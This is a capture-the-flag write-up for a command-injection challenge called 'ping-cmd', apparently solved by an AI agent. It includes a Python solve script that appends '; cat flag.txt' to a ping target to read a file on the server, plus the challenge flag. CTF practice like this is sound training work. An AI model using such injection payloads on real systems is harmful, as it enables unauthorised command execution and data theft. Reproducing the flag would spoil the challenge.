# Writeup: ping-cmd

## Header & Metadata
- **Challenge:** ping-cmd (ID: 757)
- **CTF Event / Platform:** CyLab Security Academy
- **Category:** General Skills
- **Server / Instance:** `nc xebec.cylabacademy.net 24124`
- **Attached Files:** None
- **Official Flag:** `academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}`

---

## Mô tả bài toán (Overview / Analysis)
Can you make the server reveal its secrets?
It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
You can connect to the service here `nc xebec.cylabacademy.net 24124`

### Hints
- The program uses a shell command behind the scenes.
- Sometimes, You can run more than one command at a time.

---

## Chi tiết kỹ thuật (Technical Deep-Dive)
Solved autonomously by Antigravity CTF Agent.

---

## Mã nguồn khai thác (Solve Script / Exploit)
```python
#!/usr/bin/env python3
"""
Solve script for ping-cmd (#757)
Target: xebec.cylabacademy.net:24124
"""
import re
import socket
from pathlib import Path

def get_target_conn():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = "xebec.cylabacademy.net", 24124
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            if line.startswith("HOST=") and line.split("=", 1)[1]:
                host = line.split("=", 1)[1].strip()
            elif line.startswith("PORT=") and line.split("=", 1)[1]:
                try:
                    port = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
    return host, port

def solve():
    host, port = get_target_conn()
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))
    
    # Receive initial prompt
    s.recv(4096)
    
    # Send payload chaining command execution after ping target
    payload = b"8.8.8.8; cat flag.txt\n"
    s.sendall(payload)
    
    resp = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    text = resp.decode(errors="ignore")
    print(text)
    
    match = re.search(r"academy\{[^}]+\}", text)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        out_flag = Path(__file__).resolve().parent / "flag.txt"
        out_flag.write_text(flag + "\n")
        return flag
    else:
        print("[-] Flag pattern not found in output.")
        return None

if __name__ == "__main__":
    solve()

```

---

## Log thực thi & Flag (Output & Verification)
```text
[+] Flag verified and saved to flag.txt:
academy{p1nG_c0mm@nd_3xpL0it_su33essFuL_0b4c0edc}
```
